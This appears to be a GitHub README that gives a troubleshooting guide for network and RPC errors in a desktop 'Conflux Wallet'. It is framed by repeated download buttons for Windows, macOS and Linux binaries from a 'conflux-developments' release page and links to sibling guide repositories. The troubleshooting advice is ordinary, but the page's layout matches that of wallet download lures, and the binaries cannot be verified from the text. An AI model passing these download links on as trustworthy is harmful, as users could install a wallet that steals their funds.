![Conflux Wallet](assets/banner-article.png)

# Conflux Wallet Network Error

<p align="center">Conflux Wallet Network Error: the checks, in order, for the current desktop release.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

**Short answer.** A network or RPC error means the app could not complete a request to the chain: no connection, a blocked or rate-limited endpoint, a proxy in the way, or a clock that is far enough wrong to break TLS. It is a transport problem, and your funds are unaffected by it.

## What the error means

The wallet asks a node questions - what is this balance, what is this nonce, did this transaction land - and an RPC error is that conversation failing. Nothing was signed, nothing was sent, and nothing about your accounts changed.

Which is why the right response is diagnostic rather than corrective. There is no setting that "fixes" a network error; there is a reason the request did not arrive, and finding it takes two minutes.

## Your connection first

Confirm the machine reaches the internet at all, then confirm it reaches it the way the app needs. A browser can work through a cached page while the app's live request fails, so the browser succeeding proves less than it appears to.

Try a different network - a phone hotspot is the fastest test - and see whether the error follows the machine or the connection. That single experiment splits the problem in half, and it costs nothing: a hotspot that works tells you to look at the router, and one that fails tells you to look at the machine.

## The endpoint

The wallet talks to a node, and a public node rate-limits. A burst of requests - opening several accounts, refreshing repeatedly - can trip a limit that then looks like an outage for a few minutes.

Waiting usually clears it. If it recurs at the same time every day, something else on the machine is competing for the same endpoint, or the endpoint is genuinely overloaded. A wallet that lets you choose an endpoint gives you a way out: switching to another node separates a limited endpoint from a broken connection in one step. https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-espace-rpc-and-chain-id.md explains what the endpoint is and why it is a choice.

## The wrong network

An app configured for the testnet and a balance that lives on mainnet produces exactly this class of confusion: requests succeed, results are empty, and a user concludes the funds are gone. The same is true across the two spaces.

Check which network and which space the app is showing before believing any error message about connectivity. https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-stuck-on-connecting.md covers the difference between a blank window and a spinning one.

## Clock and certificate problems

TLS certificates are validated against the system clock. A machine whose clock has drifted far enough fails every secure request, and the failure surfaces as a generic network error rather than as "your clock is wrong".

If the error arrived with no change on your side, check the clock and the system certificate store. Set the clock to update automatically rather than correcting it by hand, because a hand-set clock drifts back within weeks and the error returns with no cause you can see. This is common after a laptop has been asleep for weeks or a virtual machine has been suspended.

## A firewall or VPN

Corporate networks, some antivirus suites and most VPN clients intercept HTTPS. An app that has not been given permission looks exactly like an app with no internet, and the browser's success is irrelevant because it was configured separately.

Test with the VPN off, and if that fixes it, the answer is a rule rather than a workaround. Do not install a "network fixer" from a search result to solve this; the fix is on your machine's settings.

## Retrying properly

Retry once, then stop and diagnose. Repeated retries against a rate-limited endpoint extend the limit, and repeated retries of a *transaction* are worse: a send that appears to fail may have been broadcast, and a second send is a second payment.

https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-balance-shows-zero.md covers what to check when a request succeeds but the answer looks wrong, which is a different problem from a request failing outright.

## When the chain is the problem

Occasionally it is not you. A hardfork requires updated software, an endpoint provider has an outage, or the network is congested enough that public nodes time out. In those cases everybody sees it at once, and the fix is to wait or to update.

Updating matters specifically because a client that does not understand a fork cannot follow the chain, and the error may be the only symptom it can produce. A fork that changes the transaction format is the sharpest version of this: the old build can still read balances and still fails to send. The current release from the release page (https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) is the baseline; https://github.com/conflux-developments/setup-handbook/blob/HEAD/update-conflux-wallet-to-latest-release.md is the procedure.

## Telling it apart from corruption

A network error clears when connectivity returns; a corrupted local database does not. If retries fail identically after a reboot and a network change, the problem is more likely local storage than transport.

That is when the copy-first repair in https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/repair-corrupt-conflux-wallet-database.md applies. The distinction is worth holding: transport problems fix themselves, storage problems do not. This is a maintained product: the current release published on the release page is where fixes and support land.

## FAQ

### What does a network error mean in Conflux Wallet?

A request to the chain did not complete - connection, endpoint, proxy or clock. Nothing was signed and nothing changed on-chain.

### Why does it say RPC error?

The node refused or could not answer the request, often because of rate limiting or an overloaded public endpoint. Wait and retry once.

### Can a network error lose my funds?

No. It prevents the app from reading the chain; it does not move anything. Verify on the explorer if you want certainty.

### Why does the browser work when the app does not?

Browsers are often configured for a proxy or VPN that the app does not use. Test with the VPN off and check firewall permissions.

### Should I keep retrying?

Once. Repeated retries against a limited endpoint make it worse, and retrying a *transaction* risks sending it twice.

---

## Get Conflux Wallet

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

## Related guides

- [Stuck on Connecting](https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-stuck-on-connecting.md)
- [Repair a Corrupt Wallet Database](https://github.com/conflux-developments/ecosystem-guides/blob/HEAD/repair-corrupt-conflux-wallet-database.md)

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
